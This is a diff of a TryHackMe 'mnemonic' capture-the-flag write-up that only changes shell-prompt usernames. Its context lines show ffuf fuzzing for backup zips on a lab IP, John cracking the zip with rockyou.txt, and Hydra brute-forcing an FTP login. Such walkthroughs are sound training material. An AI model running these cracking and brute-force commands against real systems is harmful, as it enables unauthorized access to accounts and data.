@@ -86,7 +86,7 @@ backups                 [Status: 301, Size: 327, Words: 20, Lines: 10]
 
 So let's enum more.
 
- argenestel@parrot  ~/Desktop/tryhackme/mnemonic  ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.148.195/webmasters/backups/FUZZ.zip
+ root@parrot  ~/Desktop/tryhackme/mnemonic  ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.148.195/webmasters/backups/FUZZ.zip
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -120,7 +120,7 @@ Ahh the zip seems encrypted.
 So john have script which converts zip to john hash format and john can crack that.
 
 ```bash
-argenestel@parrot  ~/Desktop/tryhackme/mnemonic  john --wordlist=/usr/share/wordlists/rockyou.txt john.hash
+root@parrot  ~/Desktop/tryhackme/mnemonic  john --wordlist=/usr/share/wordlists/rockyou.txt john.hash
 Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
 Will run 4 OpenMP threads
@@ -135,7 +135,7 @@ In zip we can see user info and get username.
 Now Bruteforce the ftp pass.
 
 ```bash
-argenestel@parrot  ~/Desktop/tryhackme/mnemonic/backups  hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.148.195
+root@parrot  ~/Desktop/tryhackme/mnemonic/backups  hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.148.195
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-28 16:20:23
